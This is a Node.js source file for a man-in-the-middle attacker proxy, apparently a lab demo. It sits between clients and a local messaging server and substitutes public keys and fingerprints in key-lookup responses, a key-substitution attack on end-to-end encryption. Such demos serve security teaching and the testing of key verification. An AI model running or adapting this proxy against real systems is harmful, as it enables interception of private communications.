const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const cors = require('cors');
const colors = require('colors');

const app = express();
const PORT = 8080; // Attacker runs on 8080
const TARGET = 'http://localhost:5000'; // Real server on 5000

console.log(colors.red.bold('😈 MITM ATTACKER PROXY STARTED ON PORT ' + PORT));
console.log(colors.yellow('Forwarding traffic to: ' + TARGET));

app.use(cors());

// 1. Intercept Public Key Requests (The Attack)
// When Alice asks for Bob's key, we give her OUR key (or a fake one)
app.use('/api/users/:id/public-key', createProxyMiddleware({
    target: TARGET,
    changeOrigin: true,
    selfHandleResponse: true, // We want to modify the response
    onProxyRes: function (proxyRes, req, res) {
        let body = [];
        proxyRes.on('data', function (chunk) {
            body.push(chunk);
        });
        proxyRes.on('end', function () {
            try {
                body = Buffer.concat(body).toString();
                const jsonResponse = JSON.parse(body);

                console.log(colors.cyan(`\n[Intercepted] Public Key Request for User: ${jsonResponse.username}`));
                console.log(colors.green(`Original Key Fingerprint: ${jsonResponse.keyFingerprint.substring(0, 15)}...`));

                // --- THE ATTACK ---
                // We replace the legitimate key with a fake one
                // In a real attack, this would be a key the attacker owns.
                // Here we modify it to break the signature verification.
                jsonResponse.publicKey = JSON.stringify({
                    ...JSON.parse(jsonResponse.publicKey),
                    // Modifying the key data slightly to simulate a replaced key
                    mitm_injected: "true", 
                    fake_param: "This_is_an_attack_key" 
                });
                
                // We modify the fingerprint so the client MIGHT notice if they check manually
                jsonResponse.keyFingerprint = "EVIL_FINGERPRINT_" + Date.now();

                console.log(colors.red.bold(`[ATTACK] Swapped Public Key with malicious payload!`));
                
                const responseBody = JSON.stringify(jsonResponse);
                res.setHeader('Content-Type', 'application/json');
                res.setHeader('Content-Length', Buffer.byteLength(responseBody));
                res.end(responseBody);
            } catch (e) {
                res.end(body); // Fallback if parsing fails
            }
        });
    }
}));

// 2. Pass everything else through normally
app.use('/', createProxyMiddleware({
    target: TARGET,
    changeOrigin: true,
    logLevel: 'silent' // Reduce noise
}));

app.listen(PORT);